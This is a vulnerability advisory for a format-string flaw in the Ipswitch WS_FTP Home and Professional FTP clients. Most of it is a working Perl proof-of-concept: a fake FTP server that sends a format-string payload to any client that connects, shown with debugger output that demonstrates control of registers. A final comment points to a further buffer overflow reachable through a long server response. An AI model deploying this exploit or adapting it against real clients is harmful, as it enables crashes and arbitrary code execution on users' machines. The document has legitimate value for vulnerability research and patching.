source: http://www.securityfocus.com/bid/30720/info

Ipswitch WS_FTP client is prone to a format-string vulnerability it fails to properly sanitize user-supplied input before passing it as the format specifier to a formatted-printing function.

An attacker may exploit this issue to execute arbitrary code in the context of the vulnerable application. Failed exploit attempts will likely result in a denial-of-service condition.

This issue affects the WS_FTP Home and WS_FTP Professional clients.

##################################################################################################################
#
# Ipswitch WS_FTP Home/WS_FTP Professional FTP Client Remote Format String vulnerability 
# Vendor : http://www.ipswitch.com/
# Affected Os : Windows *
# Risk : critical
#
# This bug is pretty interresting in the way you have to exploit it in a weird way...
#
# With this PoC you'll get a full control over EAX/ECX  
# (
# eax=41414141 ebx=0000000a ecx=41414141 edx=00000000 esi=41414142 edi=02b1f0ab
# eip=77d3ef68 esp=02b1f01c ebp=02b1f064 iopl=0         nv up ei pl nz na po nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
# USER32!CharLowerA+0x93:
# 77d3ef68 8a10             mov     dl,[eax]                ds:0023:41414141=??
# )
# Fake Server PoC :
use strict;
use Socket;

my $port = shift || 21;
my $proto = getprotobyname('tcp');
my $goodz = "\x41\x41\x41\x41\x41\x41\x41\x41%x%x%x%x%x%x%x%s";

my $visitor;
socket(SOCKET, PF_INET, SOCK_STREAM, $proto)
or die "To bad $!\n";
setsockopt(SOCKET, SOL_SOCKET, SO_REUSEADDR, 1);
bind(SOCKET, pack( "S n a4 x8", AF_INET, $port, "\0\0\0\0" ))
or die "Shitz port $port is allready in use, shut down your ftp server !\n";
listen(SOCKET, 5) or die "Listen: $!";
print "Fake Server started on port $port\n";
while ($visitor = accept(NEW_SOCKET, SOCKET)) {
print NEW_SOCKET $goodz;
close NEW_SOCKET;
}

# Anyways, in the WS_FTP Home client there's still a buffer overflow in the FTP server message response ( 4100 chars answer --> done ).